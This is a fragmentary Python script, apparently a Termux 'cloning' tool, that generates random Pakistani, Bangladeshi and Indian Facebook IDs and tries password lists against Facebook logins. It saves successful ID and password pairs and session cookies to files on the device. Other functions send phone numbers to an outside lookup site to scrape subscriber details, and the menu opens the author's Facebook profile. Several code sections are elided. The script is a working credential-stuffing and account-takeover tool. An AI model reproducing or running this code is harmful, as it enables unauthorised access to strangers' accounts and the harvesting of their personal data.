...
url = ("data/data/files/usr/bin/api.py")
("rm -rf api.py")
url = ("data/data/usr/bin/files/module.py")
("rm -rf module.py")
os.system('xdg-open https://www.facebook.com/profile.php?id=100026028165505&mibextid=ZbWKwL')
...
██   ████ ██   ██ ███████ ██ ██   ██                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
----------------------------------------------
\033[1;37m[-] AUTHOR    :\033[1;32m JACK SPARROW " SILENT IS HERE
\033[0;93m[•] FACEBOOK. :. Abdul Nasir
\033[1;37m[-] GITHUB    :\033[1;32m Bad BOY
\033[1;37m[-] VERSION   :\033[1;32m ERROR MEMORIES
\033[1;95m[-] STATUS    :\033[1;32mMY CHOICE 
--------------------------------------------
[-]  ENJOY FREE MY WHATSAPP FB group USER❤️ 
\033[1;37m----------------------------------------------""")
def linex():
	print('\33[1;37m----------------------------------------------')
loop = 0
...
def menu():
			...
			print('[2] Pakistani Random Cloning')
			print('[3] Bangladesh  Random Cloning')
			print('[4] Random Choice Pass ')
			print('[5] Follow me on Facebook')
			print('[NOTE]\x1b[1;92mFULL ON FACEBOOK FOR UPDATE')
			print('\x1b[1;91m[8] Exit main menu')
			linex()
			anees=input(' Choose an option: ')
			if anees in ['1','01']:
				os.system('clear')
				print(logo)
				
				linex()
				print(' Example : /sdcard/NASIR-XD-OK.txt')
				linex()
				...
				os.system('xdg-open https://www.facebook.com/profile.php?id=100026028165505&mibextid=ZbWKwL');menu()
			elif anees in ['8','08']:
				exit('')
			else:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mNASIR-Khan\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\033[1;92m[NASIR-AK-OK-OK] '+ids+' | '+pas+'\033[1;32m')
				open('/sdcard/NASIR-AK-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					
					print('\33[1;31m[NASIR-AK-OK-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/NASIR-AK-OK-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print('\033[1;92m[NASIR-AK-OK] '+ids+' | '+pas+'\033[1;32m')
				open('/sdcard/NASIR-AK-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					print('\33[1;91m[NASIR-AK-OK-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/NASIR-AK-OK-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
...
def anees1():
	os.system('clear')
	print(logo)
	print('\x1b[1;97m[1] 7 Digits Method FAST \x1b[1;92m[1]')
	print('\x1b[1;97m[2] PAK GAMES IDZ MIX Method SLOW \x1b[1;92m[2]')
	print('\x1b[1;97m[3] PAK NEW Method NORMAL \x1b[1;92m[3]')
	print('\x1b[1;97m[4] PAK SIMPLE OLD IDZ Method SLOW \x1b[1;92m[4]')
	print('\x1b[1;97m[5] BD FREE FIRE IDZ  Method FAST \x1b[1;92m[5]')
	print('\x1b[1;97m[6] INDIANA  OLD IDZ  Method FAST \x1b[1;92m[6]')
	print('\x1b[1;91m[7] Go to main menu')
	linex()
	opt = input('[√] YOUR CHOICE 😂 YOUR LUCK OPT: ')
	if opt =='1':
		random_number1()
	elif opt =='2':
		random_number2()
...
def fcrack(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36',
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\033[1;92m[NASIR-AK-OK] '+cid+' | '+ps+'\033[1;32m')
				open('NASIR-AK-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[1;31m[NASIR-kKhan-CP] '+uid+' | '+ps+'\33[0;97m')
				open('NASIR-AK-OK-cp.txt', 'a').write(uid+' | '+ps+'\n')
				cps.append(uid)
				break
			else:
				continue
...
def cinc():
    ...
    linex()
    head = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36', 'Accept-Encoding': 'gzip, deflate','Connection': 'keep-alive', 'Content-Length': '16', 'Content-Type': 'application/x-www-form-urlencoded'}
    data = {'cnnum': nmbr}
...
def zong():
    ...
    if num[0] == '0':
        ...
        nmbr = num
    head = {'User-Agent': 'Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36', 'Accept-Encoding': 'gzip, deflate','Connection': 'keep-alive', 'Content-Length': '16', 'Content-Type': 'application/x-www-form-urlencoded'}
    data = {'cnnum': nmbr}
    url = requests.post('https://freepicccs.com/search-result2.php',headers=head,data=data)
    dta = re.findall("\<div(.*?)</table>",str(url.text))
    open(".tt1.txt","w").write(str(dta))
